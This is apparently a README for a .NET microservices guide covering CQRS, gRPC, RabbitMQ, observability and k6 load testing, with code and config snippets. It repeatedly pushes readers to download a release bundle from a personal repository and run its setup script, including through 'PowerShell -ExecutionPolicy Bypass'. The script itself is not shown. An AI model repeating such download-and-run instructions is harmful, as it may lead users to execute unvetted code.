# Marketplace Public: .NET Microservices Guide (CQRS, gRPC)

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/fulanito123123/marketplace-public/releases)

<!-- Badges -->
[![C#](https://img.shields.io/badge/C%23-.NET-239120?style=flat-square&logo=c-sharp&logoColor=white)](https://docs.microsoft.com/dotnet)
[![Docker](https://img.shields.io/badge/Docker-Container-blue?style=flat-square&logo=docker&logoColor=white)](https://www.docker.com/)
[![gRPC](https://img.shields.io/badge/gRPC-Remote%20Procedure%20Call-8A2BE2?style=flat-square)](https://grpc.io/)
[![RabbitMQ](https://img.shields.io/badge/RabbitMQ-Messaging-FF6600?style=flat-square&logo=rabbitmq&logoColor=white)](https://www.rabbitmq.com/)
[![Redis](https://img.shields.io/badge/Redis-InMemory-DC382D?style=flat-square&logo=redis&logoColor=white)](https://redis.io/)
[![Elasticsearch](https://img.shields.io/badge/Elasticsearch-Search-005571?style=flat-square&logo=elasticsearch&logoColor=white)](https://www.elastic.co/)
[![Prometheus](https://img.shields.io/badge/Prometheus-Metrics-FE7A00?style=flat-square&logo=prometheus)](https://prometheus.io/)
[![k6](https://img.shields.io/badge/k6-Load%20Test-00CF5D?style=flat-square&logo=k6)](https://k6.io/)
[![MediatR](https://img.shields.io/badge/MediatR-CQRS-4B32C3?style=flat-square)](https://github.com/jbogard/MediatR)

Live releases and bundles live in the Releases page. Download and run the release bundle from:
https://github.com/fulanito123123/marketplace-public/releases

Table of contents

- About
- Who this is for
- Key concepts
- Architecture overview
- Core components
- Tech stack and topics
- Quickstart
- Local development (Docker Compose)
- Run individual services
- Configuration and secrets
- Observability and logging
- Metrics and tracing
- Load testing with k6
- CI/CD and deployment
- Scaling and resilience patterns
- Security checklist
- Testing strategy
- Contributing
- Releases
- License
- References and learning paths
- Appendix: useful commands and tips

About

This repository holds a full guide and reference implementation for building microservices with .NET and C#. It focuses on patterns and tools that support high load, scale, and reliability. The content pairs concepts with code examples, Docker Compose setups, observability configs, and test plans.

Who this is for

- Backend developers who build distributed systems with .NET.
- Architects who design services that must scale and stay reliable.
- DevOps engineers who automate deployment and monitoring.
- Teams that want a practical reference for CQRS, message-driven workflows, and observability.

Key concepts

- Microservices: small deployable services that own a bounded context.
- CQRS: separate models for reads and writes to scale and simplify composition.
- Event-driven design: use messages to decouple services and increase resilience.
- MediatR: in-process mediator for command and query handlers.
- gRPC: fast RPC protocol for inter-service sync calls.
- RabbitMQ: message broker for async communication and events.
- Redis: cache and ephemeral store to reduce load and enforce limits.
- Docker & Docker Compose: containerize and run services locally.
- ELK (Elasticsearch, Logstash, Kibana): centralized logs and search.
- Prometheus + Grafana: metrics collection and dashboards.
- k6: high-load testing tool to validate performance.

Architecture overview

- Each feature lives in a single service.
- Services expose gRPC for internal sync calls and HTTP for public API or gateways.
- Commands and domain events flow via RabbitMQ.
- Reads persist in optimized read models, in separate stores if needed.
- Redis serves caching, rate limits, and ephemeral locks.
- Logs stream to Logstash then to Elasticsearch. Kibana visualizes logs.
- Metrics push from apps to Prometheus. Grafana shows dashboards.
- Performance tests run with k6 to validate SLAs.

High-level diagram

![Microservices architecture diagram](https://raw.githubusercontent.com/microsoft/azure-devops-server-samples/master/Images/architecture.svg)

Core components

- gateway-api: HTTP gateway that exposes public REST endpoints. It validates requests, authenticates, and forwards to internal services via gRPC.
- product-service: CRUD and domain logic for product catalog. Emits events on changes.
- order-service: Handles orders, composes product info and inventory checks.
- inventory-service: Manages stock. Subscribes to events to sync.
- payment-service: Simulates payment flows. Integrates with external gateways.
- notification-service: Sends email or push messages. Listens to order events.
- auth-service: Identity and token issuer. Simple JWT provider for demo.
- common-libs: Shared DTOs, Protobuf definitions, and utilities such as logging, metrics, and error models.

Tech stack and topics

This repo covers practical use of:
- csharp
- docker
- docker-compose
- dotnet-core
- elasticsearch
- elk-stack
- grafana
- k6
- kibana
- microservices
- portainer
- prometheus

Design principles

- Single responsibility per service.
- Explicit contracts via Protobuf and DTOs.
- Event-driven integration for loose coupling.
- Observability by design: telemetry in all services.
- Config by environment: use secrets stores in production.
- Automation ready: Docker, manifests, test scripts.

Development workflow

- Clone repo.
- Start dev environment using Docker Compose.
- Run migrations and seeders.
- Use test scripts and k6 to exercise services.
- Iteratively refine services.

Quickstart

Prerequisites

- Git
- Docker
- Docker Compose
- .NET 7 SDK (or .NET 6 if targeting LTS)
- Optional: kubectl and Helm for Kubernetes deploys
- k6 for load testing
- A terminal that supports bash or PowerShell

Clone the repo

git clone https://github.com/fulanito123123/marketplace-public.git
cd marketplace-public

Run the dev stack

The repo ships a docker-compose.dev.yml that boots the whole platform. Use this for local work.

docker compose -f docker-compose.dev.yml up --build

This file brings up:
- Postgres for service data
- RabbitMQ
- Redis
- Elasticsearch + Kibana + Logstash
- Prometheus + Grafana
- All demo services built from source

Wait for all services to report healthy. Use docker compose ps to check status.

Work with the database

You will find SQL scripts and EF Core migrations in each service. For quick starts the compose file runs a migrate and seed job for each service.

To run a migration manually:

cd services/product-service
dotnet ef database update --project ./ProductService.csproj

Run individual services

You can run a single service while the rest run in Docker. Use the service folder and start from Visual Studio or the command line.

Example:

cd services/order-service
dotnet run

The service connects to the shared RabbitMQ and Redis using the compose network. Check appsettings.Development.json to find ports.

gRPC contracts

Protobuf files live under proto/. Keep them in sync. Use the proto files to generate Grpc clients in any language.

Example proto snippet

syntax = "proto3";

package marketplace;
option csharp_namespace = "Marketplace.Grpc";

service ProductService {
  rpc GetProduct(GetProductRequest) returns (ProductResponse);
}

message GetProductRequest {
  string id = 1;
}

message ProductResponse {
  string id = 1;
  string name = 2;
  double price = 3;
}

Commands, queries and events

The code uses MediatR for in-process mediation. The pattern uses:
- Command objects for writes. Handlers implement business rules.
- Query objects for reads. Handlers return optimized view models.
- Domain events published when state changes. Event handlers publish integration events or react locally.

Command example (C#)

public class CreateOrderCommand : IRequest<OrderDto>
{
    public string CustomerId { get; set; }
    public IList<OrderItemDto> Items { get; set; }
}

public class CreateOrderHandler : IRequestHandler<CreateOrderCommand, OrderDto>
{
    // handle command, save to DB, publish domain events via RabbitMQ
}

Messages and RabbitMQ

RabbitMQ exchanges and queues match event and command patterns. Each service binds to relevant exchanges. Use durable queues for critical processing. Dead-letter queues capture failed messages.

RabbitMQ config tips

- Use direct or topic exchanges depending on routing needs.
- Use prefetch per consumer to tune throughput.
- Requeue or dead-letter failed messages after retry.

Redis usage

- Cache product read models.
- Implement rate limits using counters.
- Lock critical sections using SETNX.

Observability and logging

All services use structured logging with Serilog. Logs flow to Logstash which forwards to Elasticsearch. Use fields such as trace_id, span_id, service, environment, and request_id.

Logging best practices

- Log key events at info level.
- Log exceptions with stack trace at error level.
- Correlate logs using trace IDs.

ELK setup

docker-compose.dev.yml includes an ELK stack. Logstash consumes logs from container stdout or from filebeat. Kibana exposes a view where you can search logs and build queries.

Prometheus and Grafana

Prometheus pulls metrics exposed by apps at /metrics. Each app exposes metrics using prometheus-net or OpenTelemetry. Grafana includes a base dashboard that shows requests, latency, errors, and system counters.

Example Prometheus scrape config

scrape_configs:
  - job_name: 'dotnet-services'
    static_configs:
      - targets: ['gateway-api:9184','product-service:9184','order-service:9184']

Tracing

Use OpenTelemetry SDK to instrument code. Export traces to Jaeger or to an OTLP collector. Traces help correlate gRPC calls and message flows.

Load testing with k6

The repo includes sample k6 scripts in tests/k6. They emulate common user flows at scale. Use k6 to run stress and soak tests.

Example k6 script (simplified)

import http from 'k6/http';
import { check, sleep } from 'k6';

export let options = {
  vus: 50,
  duration: '5m',
};

export default function () {
  let res = http.get('http://localhost:5000/api/products');
  check(res, { 'status was 200': (r) => r.status == 200 });
  sleep(1);
}

Run k6

k6 run tests/k6/scenario-products.js

Use different VU counts to test autoscale and caching behavior. Track metrics in Grafana.

Performance tuning checklist

- Tune database indexes.
- Use read models for heavy queries.
- Cache frequently read items in Redis.
- Tune RabbitMQ prefetch and concurrency.
- Tune gRPC thread pool and connection settings.
- Use bulk operations where possible.

Docker and containers

Every service ships a Dockerfile. The Dockerfile uses multi-stage builds and strips debug artifacts. The images build on official .NET images.

Example Dockerfile basics

FROM mcr.microsoft.com/dotnet/aspnet:7.0 AS base
WORKDIR /app
EXPOSE 80

FROM mcr.microsoft.com/dotnet/sdk:7.0 AS build
WORKDIR /src
COPY . .
RUN dotnet publish -c Release -o /app

FROM base AS final
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "Service.dll"]

Docker Compose tips

- Use named volumes for persistent stores.
- Use depends_on with healthcheck to order startup.
- Use variable substitution for environment overrides.

Kubernetes and manifests

The repo includes Helm chart examples in k8s/helm. Charts define Deployments, Services, ConfigMaps, and Prometheus ServiceMonitors.

Deploy steps (k8s)

- Build images and push to registry.
- Update image tags in Helm values.
- helm upgrade --install marketplace k8s/helm -n marketplace

CI/CD

Use GitHub Actions for build and test. A typical pipeline runs:
- dotnet restore and build
- unit tests
- container image build
- push image to registry
- run integration tests in ephemeral compose
- publish release asset

Security

- Use JWT for auth. Rotate signing keys.
- Validate input at API boundaries.
- Use TLS for service-to-service communication in production.
- Limit permissions of service accounts.
- Scan images for vulnerabilities.

Security checklist

- Enforce least privilege for DB accounts.
- Use secret manager for connection strings.
- Rotate credentials on schedule.
- Harden RabbitMQ with users and vhosts.

Testing strategy

- Unit tests for domain logic.
- Integration tests that spin up in-memory or test containers for DB and RabbitMQ.
- Contract tests for gRPC endpoints.
- End-to-end tests with Docker Compose.
- Performance tests with k6.

Unit test example (C# xUnit)

[Fact]
public void CreateOrder_WithValidItems_ReturnsOrder()
{
    var handler = new CreateOrderHandler(...);
    var command = new CreateOrderCommand { ... };
    var result = handler.Handle(command, CancellationToken.None).Result;
    Assert.NotNull(result);
    Assert.Equal(command.CustomerId, result.CustomerId);
}

Message-driven testing

- Use Testcontainers to run RabbitMQ during tests.
- Publish events and assert side effects.
- Use consumer mocks to validate outgoing messages.

Health checks

Each service exposes a health endpoint:
- /health/live for liveness
- /health/ready for readiness

Container orchestrators use these endpoints to manage rolling updates.

Scaling and resilience patterns

- Use horizontally scalable stateless services.
- Partition data where needed to avoid hotspots.
- Use circuit breakers for external calls.
- Use retries with exponential backoff for transient errors.
- Implement bulkheads to isolate resources.
- Use canary or blue/green deploys for safe rollouts.

Example circuit breaker using Polly

Policy = Policy
    .Handle<HttpRequestException>()
    .CircuitBreaker(handledEventsAllowedBeforeBreaking: 5, durationOfBreak: TimeSpan.FromSeconds(30));

Observability patterns

- Emit structured logs with JSON.
- Tag logs and metrics with service and environment.
- Record request and processing latency.
- Record message processing time and retry counts.

Example log entry (JSON)

{
  "timestamp": "2025-01-01T12:00:00Z",
  "service": "order-service",
  "level": "Information",
  "message": "Order created",
  "orderId": "1234",
  "traceId": "abcd-ef01"
}

Deployment environments

- development: local compose, relaxed security, verbose logs.
- staging: near production settings, scale and perf tests.
- production: TLS, autoscale rules, strict logging levels.

Configuration and secrets

- Use appsettings.{Environment}.json for per-environment config.
- Use environment variables for secrets in containers.
- Integrate with secret stores like Azure Key Vault or HashiCorp Vault in production.

Common environment variables

- DATABASE_URL
- RABBITMQ_URL
- REDIS_URL
- ELASTICSEARCH_URL
- JWT_SIGNING_KEY
- PROMETHEUS_SCRAPE_PORT

Operational runbook

- Check health endpoints.
- Check logs in Kibana for errors.
- Check metrics in Grafana for latency spikes.
- Check RabbitMQ queue lengths.
- Restart failing services using docker compose restart or kubectl rollout restart.

Troubleshooting tips

- If a service fails to connect to RabbitMQ, validate DNS and network, then check credentials.
- If logs do not appear in Kibana, verify Logstash and Beats configs.
- If Prometheus shows no metrics, check /metrics endpoint and firewall rules.

Contributing

- Fork the repo and create a feature branch.
- Run tests locally in CI mode.
- Follow the code style in .editorconfig.
- Open a pull request and describe changes and test plan.
- Tag your PR with relevant labels: feature, bug, docs, test.

Code review checklist

- Keep methods short and focused.
- Avoid hidden side effects.
- Use DTOs for external communication.
- Keep domain logic inside domain services.

Releases

Download the latest release bundle and run the installer from the Releases page:
https://github.com/fulanito123123/marketplace-public/releases

The release assets contain:
- docker-compose.release.yml: a stripped-down compose file for small clusters.
- binaries/marketplace-cli: a cross-platform CLI to interact with the stack.
- scripts/setup-release.sh: a script that sets up env and launches services.

After you download the release bundle, run the included setup script to bootstrap the runtime. Example:

# extract the release
tar -xzf marketplace-public-release.tar.gz
cd marketplace-public-release

# run setup (Linux / macOS)
chmod +x scripts/setup-release.sh
./scripts/setup-release.sh

On Windows use the .ps1 variant:

PowerShell -ExecutionPolicy Bypass -File .\scripts\setup-release.ps1

The script configures environment variables and starts core services. The release also includes a README inside the bundle that lists available assets and a short upgrade guide. If the release page or the files change, check the Releases section on GitHub for updated instructions and assets.

Repository topics

This repo touches many tools and topics:
csharp, docker, docker-compose, dotnet-core, elasticsearch, elk-stack, grafana, k6, kibana, microservices, portainer, prometheus

Appendix: useful commands and quick references

Docker compose

# start full dev stack
docker compose -f docker-compose.dev.yml up --build

# stop and remove containers
docker compose -f docker-compose.dev.yml down -v

Docker

# build container for a service
docker build -t marketplace/product-service:local ./services/product-service

# run the container and map port
docker run --rm -p 5001:80 --env-file .env marketplace/product-service:local

dotnet

# run a service locally
cd services/gateway-api
dotnet run

# run unit tests
dotnet test ./tests/UnitTests

k6

# run a local test
k6 run tests/k6/scenario-products.js

Prometheus & Grafana

- Grafana: http://localhost:3000 (use admin/admin on local dev)
- Prometheus: http://localhost:9090
- Kibana: http://localhost:5601

RabbitMQ

- Management UI: http://localhost:15672 (guest/guest in dev)
- Check queues and bindings for message flow.

Common troubleshooting commands

# show container logs
docker compose logs -f product-service

# show recent logs for a unit
docker logs --tail 200 product-service

# check network connectivity from a container
docker exec -it product-service bash
curl -sS http://product-service:80/health/ready

Reference links

- .NET: https://docs.microsoft.com/dotnet
- MediatR: https://github.com/jbogard/MediatR
- gRPC: https://grpc.io/docs/
- RabbitMQ: https://www.rabbitmq.com/
- Redis: https://redis.io/
- Elasticsearch: https://www.elastic.co/elastic-stack
- Prometheus: https://prometheus.io/
- Grafana: https://grafana.com/
- k6: https://k6.io/

Developer tips

- Keep Protobufs small and stable. Use semantic versioning for contracts.
- Treat events as append-only. Do not delete old events unless you perform a migration.
- Keep read models denormalized for fast queries.
- Use health checks and readiness probes for safe deploys.
- Automate as much test setup as possible.

Images and visual assets

- Use the logos and badges above to create a visual guide.
- Add architectural diagrams to the docs folder to track changes.

Large-scale patterns

- Use consumer groups to scale message processing.
- Use sharding if a single database reaches limits.
- Tune GC and thread pool for .NET in high-load services.

Monitoring SLOs

- Define SLOs for latency, error rate, and availability.
- Create alert rules in Prometheus for SLO breaches.
- Automate paging or slack notifications for critical alerts.

Example alert rules

- High error rate: alert when errors > 1% for 5 minutes.
- High latency: alert when p95 > 500ms.

Event versioning

- Add a version field to event payloads.
- Keep consumers tolerant to extra fields.
- Migrate consumers gradually.

Message ordering and idempotency

- Use idempotency keys for commands that may retry.
- Use sequence numbers for ordered processing.

Scaling database writes

- Use write queues and batch processing.
- Use CQRS to offload heavy reads from write paths.

Common pitfalls

- Tight coupling via direct DB access across services.
- Long synchronous chains of gRPC calls.
- Missing correlation IDs across logs and metrics.

Useful links for learning

- Vaughn Vernon, "Implementing Domain-Driven Design"
- Greg Young, material on CQRS and Event Sourcing
- Microsoft microservices guidance for .NET

Command cheat sheet

# rebuild all images
docker compose -f docker-compose.dev.yml build --no-cache

# run a single service in compose
docker compose -f docker-compose.dev.yml up --no-deps --build product-service

# shell into a running container
docker exec -it product-service /bin/bash

Contributing guide (short)

- Fork, branch, implement, test, PR.
- Keep changes small and atomic.
- Add unit tests for business logic.
- Update docs and diagrams when you change architecture.

License

This project uses the MIT license. See LICENSE file for details.

References and further reading

- .NET performance docs
- RabbitMQ production advice
- Redis best practices
- Prometheus monitoring guide
- k6 load testing docs

End of file.